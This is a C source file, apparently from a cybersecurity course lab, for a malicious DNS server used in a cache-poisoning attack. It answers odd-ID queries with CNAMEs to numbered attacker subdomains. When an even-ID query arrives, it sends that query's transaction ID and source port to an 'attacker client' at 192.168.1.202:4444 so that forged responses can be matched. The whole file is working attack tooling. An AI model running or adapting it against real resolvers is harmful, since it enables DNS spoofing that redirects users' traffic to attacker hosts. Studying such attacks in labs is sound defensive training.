/**
 * DNS Server implementation that handles DNS requests and responds with CNAME records.
 * Special behavior: Even TXIDs get example domain and trigger notification,
 * Odd TXIDs get numbered attacker subdomains.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <ldns/ldns.h>

// Configuration constants
#define SERVER_PORT 53
#define BUFFER_SIZE 512
#define ATTACKER_CLIENT_IP "192.168.1.202"
#define ATTACKER_CLIENT_PORT 4444
#define DNS_TTL 600
#define MAX_HOSTNAME_LENGTH 100
#define EXAMPLE_DOMAIN "www.example.cybercourse.com"
#define ATTACKER_DOMAIN_FORMAT "ww%d.attacker.cybercourse.com"
#define SUCCESS 0
#define ERROR 1

/**
 * Sends transaction ID and port to monitoring client
 * @param txid DNS transaction ID
 * @param port Source port from request
 */
void send_txid_port_to_client(unsigned short txid, unsigned short port) {
    int sockfd;
    struct sockaddr_in client_addr;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&client_addr, 0, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(ATTACKER_CLIENT_PORT);

    if (inet_pton(AF_INET, ATTACKER_CLIENT_IP, &client_addr.sin_addr) <= 0) {
        perror("Invalid client IP address");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    char message[BUFFER_SIZE];
    snprintf(message, BUFFER_SIZE, "%u %u", txid, port);

    if (sendto(sockfd, message, strlen(message), 0, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
        perror("Failed to send TXID and port to client");
    }

    close(sockfd);
}

/**
 * Extracts transaction ID and port from DNS request
 * @param request DNS request packet
 * @param client_addr Client address structure
 * @param txid Output parameter for transaction ID
 * @param port Output parameter for port
 */
void extract_txid_and_port(ldns_pkt *request, struct sockaddr_in *client_addr, unsigned short *txid, unsigned short *port) {
    *txid = ldns_pkt_id(request);
    *port = ntohs(client_addr->sin_port);
}

/**
 * Receives and parses incoming DNS request
 * @return Parsed DNS packet or NULL on error
 */
ldns_pkt* receive_dns_request(int sockfd, struct sockaddr_in *client_addr, socklen_t *client_len) {
    char buffer[BUFFER_SIZE];
    int bytes_received = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)client_addr, client_len);

    if (bytes_received < 0) {
        perror("Failed to receive DNS request");
        return NULL;
    }

    ldns_pkt *request;
    ldns_status status = ldns_wire2pkt(&request, (uint8_t *)buffer, bytes_received);
    if (status != LDNS_STATUS_OK) {
        fprintf(stderr, "Failed to parse DNS packet: %s\n", ldns_get_errorstr_by_id(status));
        return NULL;
    }

    return request;
}

/**
 * Creates DNS response packet from request
 * @return Response packet or NULL on error
 */
ldns_pkt* create_dns_response(ldns_pkt *request) {
    ldns_pkt* response = ldns_pkt_clone(request);
    // Set response flags
    ldns_pkt_set_qr(response, 1);
    ldns_pkt_set_aa(response, 1);
    ldns_pkt_set_ra(response, 1);
    ldns_pkt_set_rcode(response, LDNS_RCODE_NOERROR);
    return response;
}

/**
 * Creates CNAME record based on transaction ID
 * Even TXID: example domain
 * Odd TXID: numbered attacker domain
 */
ldns_rr* create_cname_record(ldns_rr* query_rr, unsigned short txid, int counter) {
    ldns_rr* cname_rr = ldns_rr_new();
    if (!cname_rr) {
        return NULL;
    }
    
    ldns_rdf* query_name = ldns_rr_owner(query_rr);
    ldns_rr_set_owner(cname_rr, ldns_rdf_clone(query_name));

    ldns_rr_set_type(cname_rr, LDNS_RR_TYPE_CNAME);
    ldns_rr_set_class(cname_rr, LDNS_RR_CLASS_IN);
    ldns_rr_set_ttl(cname_rr, DNS_TTL);
    
    char hostname[MAX_HOSTNAME_LENGTH];
    if (txid % 2 == 0) {
        sprintf(hostname, EXAMPLE_DOMAIN);
    } else {
        sprintf(hostname, ATTACKER_DOMAIN_FORMAT, counter);
    }
    
    ldns_rdf* cname_rdf = ldns_dname_new_frm_str(hostname);
    if (!cname_rdf) {
        ldns_rr_free(cname_rr);
        return NULL;
    }
    ldns_rr_push_rdf(cname_rr, cname_rdf);
    
    return cname_rr;
}

/**
 * Sends DNS response to client
 */
void send_dns_response(int sockfd, ldns_pkt* response, struct sockaddr_in *client_addr, socklen_t client_len) {
    uint8_t *wire;
    size_t wire_len;
    ldns_pkt2wire(&wire, response, &wire_len);
    sendto(sockfd, wire, wire_len, 0, (struct sockaddr *)client_addr, client_len);
    free(wire);
}

/**
 * Main request handler. Returns SUCCESS (0) for even TXID, ERROR (1) for odd TXID
 */
int handle_dns_request(int sockfd, struct sockaddr_in *client_addr, socklen_t client_len, int counter) {
    unsigned short txid, port;
    
    // Receive and extract request info
    ldns_pkt *request = receive_dns_request(sockfd, client_addr, &client_len);
    if (!request) return ERROR;

    extract_txid_and_port(request, client_addr, &txid, &port);
    
    // Create and validate response
    ldns_pkt* response = create_dns_response(request);
    if (!response) {
        ldns_pkt_free(request);
        return ERROR;
    }

    ldns_rr_list* query_rr_list = ldns_pkt_question(request);
    if (ldns_rr_list_rr_count(query_rr_list) == 0) {
        ldns_pkt_free(response);
        ldns_pkt_free(request);
        return ERROR;
    }

    // Create and add CNAME record
    ldns_rr* query_rr = ldns_rr_list_rr(query_rr_list, 0);
    ldns_rr* cname_rr = create_cname_record(query_rr, txid, counter);
    if (!cname_rr) {
        ldns_pkt_free(response);
        ldns_pkt_free(request);
        return ERROR;
    }

    ldns_pkt_push_rr(response, LDNS_SECTION_ANSWER, cname_rr);
    
    // Send response and notify if needed
    send_dns_response(sockfd, response, client_addr, client_len);
    if (txid % 2 == 0) {
        send_txid_port_to_client(txid, port);
    }

    ldns_pkt_free(response);
    ldns_pkt_free(request);
    
    return (txid % 2 == 0) ? SUCCESS : ERROR;
}

/**
 * Main server loop - initializes socket and processes requests
 */
int main() {
    int sockfd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);

    // Initialize server socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(SERVER_PORT);

    if (bind(sockfd, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Process requests until even TXID received
    int response_counter = 1;
    int keep_running = 1;
    while (keep_running) {
        keep_running = handle_dns_request(sockfd, &client_addr, client_len, response_counter);
        response_counter++;
    }

    if (keep_running == 0) {
        close(sockfd);
        exit(SUCCESS); 
    }
    
    close(sockfd);
    return SUCCESS;

}
